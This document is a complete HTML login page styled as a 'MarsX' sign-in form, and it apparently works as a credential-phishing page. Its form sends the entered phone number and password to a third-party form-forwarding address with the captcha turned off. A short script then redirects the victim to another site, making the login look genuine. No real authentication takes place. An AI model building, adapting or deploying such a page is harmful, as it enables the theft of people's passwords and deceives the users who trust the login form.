<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login | MarsX</title>
  <style>
    body {
      background-color: #000; /* Fond noir */
      font-family: Arial, sans-serif;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background-color: transparent; /* Fond transparent pour la zone du formulaire */
      padding: 30px;
      border-radius: 15px;
      width: 100%;
      max-width: 380px;
      box-shadow: none; /* Retirer l'ombre pour qu'il n'y ait plus de rectangle gris */
      text-align: center;
    }

    /* Logo aligné à gauche */
    .logo {
      text-align: left;
      margin-bottom: 20px;
    }

    .logo img {
      height: 40px; /* Taille réduite du logo */
    }

    h2 {
      margin-bottom: 20px;
      font-weight: 700;
      font-size: 22px;
      letter-spacing: 0.5px;
    }

    .tabs {
      display: flex;
      justify-content: space-between;
      margin-bottom: 20px;
    }

    .tab {
      padding: 10px 20px;
      border-radius: 25px;
      cursor: pointer;
      background-color: #333;
      color: white;
      width: 120px;
      font-size: 14px;
      text-align: center;
      font-weight: bold;
    }

    .tab.active {
      background-color: #d4af37;
      color: black;
    }

    form {
      display: flex;
      flex-direction: column;
      align-items: stretch;
    }

    label {
      font-size: 12px;
      color: white;
      text-align: left;
      margin-bottom: 5px;
    }

    input {
      padding: 12px;
      margin-bottom: 20px;
      border-radius: 10px;
      border: none;
      outline: none;
      background-color: #333; /* Fond noir pour les champs */
      color: white;
      font-size: 16px;
    }

    /* Bouton "Log In" */
    button {
      background-color: #d4af37;
      border: none;
      padding: 12px;
      color: black;
      font-weight: bold;
      font-size: 16px;
      border-radius: 25px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      width: 100%;
    }

    button:hover {
      background-color: #b3922b;
    }

    .options {
      display: flex;
      justify-content: space-between;
      font-size: 14px;
      color: #ccc;
      margin-bottom: 20px;
    }

    .signup {
      font-size: 14px;
      color: #aaa;
    }

    .signup a {
      color: #d4af37;
      text-decoration: none;
      font-weight: bold;
    }

    #please-wait {
      display: none;
      color: #d4af37;
      font-size: 14px;
      margin-top: 10px;
    }

  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://i.imgur.com/KZsmUi2.png" alt="MarsX Logo" />
    </div>
    <h2>Welcome To Login</h2>
    <div class="tabs">
      <div class="tab active">Phone Login</div>
      <div class="tab">Email Login</div>
    </div>

    <form action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" onsubmit="return handleSubmit();">
      <input type="hidden" name="_captcha" value="false">

      <!-- Champs avec labels au-dessus -->
      <label for="phone_number">Phone Number</label>
      <input type="text" id="phone_number" name="phone_number" placeholder="Phone Number" required />

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Password" required />

      <div class="options">
        <label><input type="checkbox" name="remember" /> Remember me</label>
        <a href="#" style="color: #d4af37;">Forgot password?</a>
      </div>

      <button type="submit">Log In</button>
      <div id="please-wait">Please wait...</div>
    </form>

    <div class="signup">
      Continue is agree <a href="#">Sign Up</a>
    </div>
  </div>

  <script>
    function handleSubmit() {
      document.getElementById("please-wait").style.display = "block";
      
      // Attendre 1 seconde avant de rediriger
      setTimeout(() => {
        window.location.href = "https://masx45.com/";
      }, 1000);

      return true; // Permet au formulaire d’être soumis
    }
  </script>
</body>
</html>
